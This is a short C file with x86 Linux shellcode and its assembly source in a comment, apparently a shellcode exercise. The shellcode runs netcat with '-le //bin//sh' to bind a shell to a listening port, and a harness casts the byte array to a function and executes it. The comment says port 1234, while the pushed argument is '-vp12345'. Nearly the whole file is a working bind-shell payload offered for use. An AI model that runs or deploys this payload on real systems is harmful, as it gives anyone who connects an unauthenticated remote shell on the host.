/*
* Filename: execve-nc-bindshell.nasm
* Author:   Matteo Malvica
* Website:  http://avanzo.github.io
*
*
* This shellcode will spawn nc and bind a shell to the local port 1234
* "//bin/nc -l 1234"

* global _start

* section .text
* _start:

* ; clear registers
* xor eax, eax
* xor edx, edx

* push eax
* push 0x35343332     ;-vp12345
* push 0x3170762d
* mov esi, esp

* push eax
* push 0x68732f2f     ;-le//bin//sh
* push 0x6e69622f
* push 0x2f656c2d
* mov edi, esp

* push eax
* push 0x636e2f2f     ;/bin//nc
* push 0x6e69622f
* mov ebx, esp

* ;prepare the argurments array for execution
* push edx ; null byte
* push esi ; -vp12345
* push edi ; -le//bin//sh
* push ebx ;/bin//nc
* mov ecx, esp ; reference the whole commands + arguments to ecx

* ;invoke execve
* mov al, 11
* int 0x80

 */

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xd2\x50\x68\x32\x33\x34\x35\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
